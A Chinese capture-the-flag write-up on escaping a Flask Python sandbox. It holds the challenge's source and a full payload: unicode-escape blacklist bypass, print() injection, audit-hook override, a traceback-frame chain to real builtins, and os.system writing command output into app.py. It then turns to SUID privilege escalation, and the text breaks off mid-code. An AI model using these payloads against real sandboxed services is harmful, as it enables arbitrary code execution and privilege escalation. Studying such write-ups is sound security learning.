<span class="hljs-comment"># 尝试获取执行结果</span><br>    <span class="hljs-keyword">try</span>:<br>        status, output = result_queue.get_nowait()<br>        <span class="hljs-keyword">return</span> output <span class="hljs-keyword">if</span> status == <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: no output from sandbox.&quot;</span><br><br><br><span class="hljs-comment"># ================== 用户代码模板 ==================</span><br><span class="hljs-comment"># 注入点：&#123;text&#125; 将被替换为用户输入</span><br>CODE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    审计钩子函数：监控系统事件，仅允许特定行为。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    allowed_events = [</span><br><span class="hljs-string">        &quot;import&quot;,             # 允许 import 触发（但不会真正导入）</span><br><span class="hljs-string">        &quot;time.sleep&quot;,         # 允许 sleep（但会被拦截）</span><br><span class="hljs-string">        &quot;builtins.input&quot;,     # 允许 input 调用</span><br><span class="hljs-string">        &quot;builtins.input/result&quot;  # 允许 input 返回值</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    # 检查事件是否在白名单中</span><br><span class="hljs-string">    if event not in allowed_events:</span><br><span class="hljs-string">        raise Exception(f&quot;Audit denied: &#123;event&#125;&quot;)</span><br><span class="hljs-string">    # 不允许传参（args 必须为空）</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception(&quot;Arguments not allowed in audit events&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注册审计钩子（Python 3.8+ 支持）</span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 打印用户输入内容</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-comment"># 禁止出现在用户输入中的特殊字符</span><br>badchars = <span class="hljs-string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;</span>  <span class="hljs-comment"># 包括引号、管道、运算符、括号等</span><br><br><br><span class="hljs-comment"># ================== Flask 路由 ==================</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主页：返回当前文件源码（自我展示）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    执行端点：接收表单字段 &#x27;text&#x27;，进行过滤后执行。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    text = request.form.get(<span class="hljs-string">&#x27;text&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-comment"># 1. 字符黑名单检查</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> badchars:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 2. 将用户输入填入模板并执行</span><br>    output = safe_exec(CODE.<span class="hljs-built_in">format</span>(text))<br><br>    <span class="hljs-comment"># 3. 输出长度限制（防泄露过多信息？或隐藏真实输出？）</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) &gt; <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 4. 返回执行结果</span><br>    <span class="hljs-keyword">return</span> Response(output, status=<span class="hljs-number">200</span>)<br><br><br><span class="hljs-comment"># ================== 启动应用 ==================</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)  <span class="hljs-comment"># 监听所有网络接口</span><br></code></pre></td></tr></table></figure><p>尝试用fenjing无果，让ai给出可能的方向，撇了一眼wp，说是用unicode绕过  </p><p>关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 处理 Unicode 转义（例如 \u0061 -&gt; &#x27;a&#x27;）</span><br>code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>然后这里就是ssti加py沙箱逃逸，这个得单独终点学学，只能先看wp打。</strong></p><p>有几个需要突破的点：  </p><p>post检查环节，黑名单绕过：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">badchars = <span class="hljs-string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;</span> <br><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> badchars:<br>    <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> text:<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br></code></pre></td></tr></table></figure><p>利用点：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在进入 safe_exec 前会被unicode_escape解码，<br>这样我们传入被unicode_escape编码的字符就能绕过post阶段的检查  </p><p>接下来需要逃出它的执行模板:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">CODE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    审计钩子函数：监控系统事件，仅允许特定行为。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    allowed_events = [</span><br><span class="hljs-string">        &quot;import&quot;,             # 允许 import 触发（但不会真正导入）</span><br><span class="hljs-string">        &quot;time.sleep&quot;,         # 允许 sleep（但会被拦截）</span><br><span class="hljs-string">        &quot;builtins.input&quot;,     # 允许 input 调用</span><br><span class="hljs-string">        &quot;builtins.input/result&quot;  # 允许 input 返回值</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    # 检查事件是否在白名单中</span><br><span class="hljs-string">    if event not in allowed_events:</span><br><span class="hljs-string">        raise Exception(f&quot;Audit denied: &#123;event&#125;&quot;)</span><br><span class="hljs-string">    # 不允许传参（args 必须为空）</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception(&quot;Arguments not allowed in audit events&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注册审计钩子（Python 3.8+ 支持）</span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 打印用户输入内容</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br>output = safe_exec(CODE.<span class="hljs-built_in">format</span>(text))<br></code></pre></td></tr></table></figure><p>这里我们的输入会被放入print(“{}”)的{}里。  </p><p>需要执行任意代码，可以用 “) 来闭合print函数达到注入，最后在结尾在加沙print(“来把剩下的引号和括号闭合。  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot;)</span><br>代码执行<br><span class="hljs-keyword">print</span>(<span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><p>然后进入 sandbox_executor 函数，这里builtins会被替换为如下被定义的safe_builtins，不是真的builtins。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">    safe_builtins = &#123;<br>        <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span>,<br>        <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-built_in">filter</span>,<br>        <span class="hljs-string">&quot;list&quot;</span>: <span class="hljs-built_in">list</span>,<br>        <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>        <span class="hljs-string">&quot;addaudithook&quot;</span>: sys.addaudithook,  <span class="hljs-comment"># 允许设置审计钩子</span><br>        <span class="hljs-string">&quot;Exception&quot;</span>: Exception,<br>    &#125;<br><br>safe_globals = &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: safe_builtins&#125;<br></code></pre></td></tr></table></figure><p>我们需要找到另一条能继承可用函数的链，这里要同时考虑ast的影响：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxVisitor</span>(ast.NodeVisitor):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    自定义 AST 访问器，用于静态分析代码结构。</span><br><span class="hljs-string">    禁止访问某些危险属性或使用生成器表达式。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 黑名单：禁止访问这些特殊属性（可能被用于反射/逃逸）</span><br>    forbidden_attrs = &#123;<br>        <span class="hljs-string">&quot;__class__&quot;</span>,      <span class="hljs-comment"># 防止获取类对象</span><br>        <span class="hljs-string">&quot;__dict__&quot;</span>,       <span class="hljs-comment"># 防止修改命名空间</span><br>        <span class="hljs-string">&quot;__bases__&quot;</span>,      <span class="hljs-comment"># 类继承信息</span><br>        <span class="hljs-string">&quot;__mro__&quot;</span>,        <span class="hljs-comment"># 方法解析顺序</span><br>        <span class="hljs-string">&quot;__subclasses__&quot;</span>, <span class="hljs-comment"># 可用于获取所有类，绕过限制</span><br>        <span class="hljs-string">&quot;__globals__&quot;</span>,    <span class="hljs-comment"># 函数全局变量</span><br>        <span class="hljs-string">&quot;__code__&quot;</span>,       <span class="hljs-comment"># 函数字节码</span><br>        <span class="hljs-string">&quot;__closure__&quot;</span>,    <span class="hljs-comment"># 闭包变量</span><br>        <span class="hljs-string">&quot;__func__&quot;</span>, <span class="hljs-string">&quot;__self__&quot;</span>,     <span class="hljs-comment"># 绑定方法相关</span><br>        <span class="hljs-string">&quot;__module__&quot;</span>,     <span class="hljs-comment"># 模块信息</span><br>        <span class="hljs-string">&quot;__import__&quot;</span>,     <span class="hljs-comment"># 动态导入</span><br>        <span class="hljs-string">&quot;__builtins__&quot;</span>,   <span class="hljs-comment"># 内建命名空间</span><br>        <span class="hljs-string">&quot;__base__&quot;</span>        <span class="hljs-comment"># 基类</span><br>    &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Attribute</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        当遇到属性访问时（如 obj.attr），检查是否为禁止属性。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.attr, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> node.attr <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.forbidden_attrs:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Forbidden attribute access&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.generic_visit(node)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_GeneratorExp</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        禁止使用生成器表达式（例如 (x for x in range(10))）</span><br><span class="hljs-string">        因为它可能导致延迟求值或内存消耗过大等问题。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Generator expressions are not allowed&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><strong>什么是AST?</strong><br>AST 访问器：  </p><p>是一个在python来进行静态审计代码的办法。把代码放进去审计，是不会运行的，AST 分析的是代码的结构，不会执行代码，是静态分析。  </p><p>那SandboxVisitor(ast.NodeVisitor)大概就是把输入的字符里的<strong>方法</strong>，进行python解析，然后检查语法节点。<br>大概是检查每一个魔术方法的链接，只要链接上有指定的方法就会进行动作。  </p><p>所以在进入 safe_exec函数后就得考虑：<br>safe_builtins是被自定义过的builtins只有几个函数可用，还有就是ast审查，  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">f safe_exec(code: <span class="hljs-built_in">str</span>, timeout=<span class="hljs-number">1</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    安全地执行一段代码，包含超时控制和 AST 检查。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    步骤：</span><br><span class="hljs-string">    1. 解码 Unicode 转义字符</span><br><span class="hljs-string">    2. 解析语法树并进行 AST 安全检查</span><br><span class="hljs-string">    3. 启动子进程执行代码（避免阻塞主服务）</span><br><span class="hljs-string">    4. 设置超时终止机制</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    返回：执行结果或错误信息</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 处理 Unicode 转义（例如 \u0061 -&gt; &#x27;a&#x27;）</span><br>    code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br><br>    <span class="hljs-comment"># 解析成抽象语法树（AST）</span><br>    tree = ast.parse(code)<br><br>    <span class="hljs-comment"># 使用自定义访问器检查 AST 是否包含非法操作</span><br>    <span class="hljs-keyword">try</span>:<br>        SandboxVisitor().visit(tree)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: Suspicious code detected during AST analysis.&quot;</span><br><br>    <span class="hljs-comment"># 创建多进程队列用于接收执行结果</span><br>    result_queue = multiprocessing.Queue()<br><br>    <span class="hljs-comment"># 启动子进程执行代码（隔离运行环境）</span><br>    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))<br>    p.start()<br>    p.join(timeout=timeout)  <span class="hljs-comment"># 最多等待 timeout 秒</span><br><br>    <span class="hljs-comment"># 超时处理</span><br>    <span class="hljs-keyword">if</span> p.is_alive():<br>        p.terminate()  <span class="hljs-comment"># 强制终止进程</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout: code took too long to run.&quot;</span><br><br>    <span class="hljs-comment"># 尝试获取执行结果</span><br>    <span class="hljs-keyword">try</span>:<br>        status, output = result_queue.get_nowait()<br>        <span class="hljs-keyword">return</span> output <span class="hljs-keyword">if</span> status == <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: no output from sandbox.&quot;</span><br></code></pre></td></tr></table></figure><p>这里官方wp主要讲了Exception这条链：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">e.<span class="hljs-emphasis">__traceback__</span> → 指向异常发生时的 traceback 对象<br><br>traceback 里包含 tb_frame → 指向异常发生的 栈帧 frame 对象<br><br>frame 里包含 f_locals、f_globals、f_back → 可以沿着链条访问之前的局部变量、全局变量、调用栈<br><br>可以逃逸到exec外的全局拿<span class="hljs-emphasis">__builtins__</span><br></code></pre></td></tr></table></figure><p>再看一遍执行模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">CODE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    审计钩子函数：监控系统事件，仅允许特定行为。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    allowed_events = [</span><br><span class="hljs-string">        &quot;import&quot;,             # 允许 import 触发（但不会真正导入）</span><br><span class="hljs-string">        &quot;time.sleep&quot;,         # 允许 sleep（但会被拦截）</span><br><span class="hljs-string">        &quot;builtins.input&quot;,     # 允许 input 调用</span><br><span class="hljs-string">        &quot;builtins.input/result&quot;  # 允许 input 返回值</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    # 检查事件是否在白名单中</span><br><span class="hljs-string">    if event not in allowed_events:</span><br><span class="hljs-string">        raise Exception(f&quot;Audit denied: &#123;event&#125;&quot;)</span><br><span class="hljs-string">    # 不允许传参（args 必须为空）</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception(&quot;Arguments not allowed in audit events&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注册审计钩子（Python 3.8+ 支持）</span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 打印用户输入内容</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>那最后，<br>构建的payload要满足，绕过 badchars 黑名单，绕过 safe_builtins 拿到全局的 builtins，之后是绕过AST的审查，最后绕过输出5个字符的限制  </p><p>看到官方wp给的payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">text=<span class="hljs-string">&quot;)</span><br><span class="hljs-string">list=lambda x:True </span><br><span class="hljs-string">len=lambda x:False</span><br><span class="hljs-string">#从写list和len方法，绕过执行模板的审计钩子 my_audit_checker</span><br><span class="hljs-string"></span><br><span class="hljs-string">try:</span><br><span class="hljs-string">    1/0</span><br><span class="hljs-string"># 尝试报错</span><br><span class="hljs-string">#故意制造一个异常（除零错误），目的是获取当前的 traceback（栈追踪）。</span><br><span class="hljs-string">#因为异常发生时，Python 会生成一个 traceback 对象，记录调用栈信息。</span><br><span class="hljs-string">except Exception as e:</span><br><span class="hljs-string">    frame = e.__traceback__.tb_frame.f_back</span><br><span class="hljs-string">    builtins = frame.f_globals[&#x27;__builtins__&#x27;]</span><br><span class="hljs-string">    builtins.exec(&quot;</span>builtins.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls / -al&gt;app.py&#x27;</span>)<span class="hljs-string">&quot;)    </span><br><span class="hljs-string">    #这里__import__被ast拦了，所以放成字符串丢到exec里（也可以用__getattribute__获取__import__）</span><br><span class="hljs-string">    #例如 getattr(&#x27;__imp&#x27;+&#x27;__opt__&#x27;)(&#x27;os&#x27;)</span><br><span class="hljs-string">    #frame.f_globals[&#x27;SandboxVisitor&#x27;].visit_Attribute=lambda x,y:None  #重写visit_Attribute后</span><br><span class="hljs-string">    #builtins.__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;app.py&#x27;) #也ok</span><br><span class="hljs-string">print(&quot;</span><br><br><span class="hljs-comment">#得unicode编码</span><br></code></pre></td></tr></table></figure><p>所以说在exp中制造异常是为了利用__traceback__链接来拿到f_back里的f_globals里的builtins  </p><p>然后用exec来执行字符串来绕过SandboxVisitor的审查，因为ast是不会对字符串进行解析的  </p><p>另一种绕过andboxVisitor的解法：<br>替换ast函数：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">frame.f_globals[<span class="hljs-string">&#x27;SandboxVisitor&#x27;</span>].visit_Attribute=<span class="hljs-keyword">lambda</span> x,y:<span class="hljs-literal">None</span> <br><span class="hljs-comment">#把自定义的SandboxVisitor两个参数置空</span><br>builtins.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls /&gt;app.py&#x27;</span>)<br><span class="hljs-comment">#就能直接使用import了</span><br></code></pre></td></tr></table></figure><p>最后需要对付的是输出时的限制5个字符：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br></code></pre></td></tr></table></figure><p>这里容易想到是写入文件，由于权限问题最好能写入到web能访问的文件，所以写入app.py  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">total</span> <span class="hljs-number">72</span> drwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">3</span> <span class="hljs-number">00</span>:<span class="hljs-number">12</span> app lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">7</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> bin -&gt; usr/bin drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Mar <span class="hljs-number">29</span> <span class="hljs-number">2024</span> boot drwxr-xr-x <span class="hljs-number">5</span> root root <span class="hljs-number">360</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> dev -rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">272</span> May <span class="hljs-number">1</span> <span class="hljs-number">16</span>:<span class="hljs-number">15</span> entrypoint.sh drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> etc drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> home lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">7</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> lib -&gt; usr/lib lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">9</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> lib64 -&gt; usr/lib64 -rw------- <span class="hljs-number">1</span> root root <span class="hljs-number">101</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> m1n1FL@G drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> media drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> mnt drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> opt dr-xr-xr-x <span class="hljs-number">520</span> root root <span class="hljs-number">0</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> proc drwx------ <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Aug <span class="hljs-number">2</span> <span class="hljs-number">2024</span> root drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> run lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">8</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> sbin -&gt; usr/sbin drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> srv dr-xr-xr-x <span class="hljs-number">13</span> root root <span class="hljs-number">0</span> Aug <span class="hljs-number">18</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> sys drwxrwxrwt <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">3</span> <span class="hljs-number">00</span>:<span class="hljs-number">12</span> tmp drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> usr drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> var <br></code></pre></td></tr></table></figure><p>然后尝试读取m1n1FL@G会发现没有权限  </p><p>这时需要进行提权，wp上的解法是用suid提权</p><p><strong>suid权限</strong>，指一个应用可以被任何人执行，但是由于应用有suid权限，当另一人执行应用时会等价于是应用的所有者权限所执行  </p><p>find &#x2F; -perm &#x2F;4000<br>找到拥有suid权限的程序：  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span 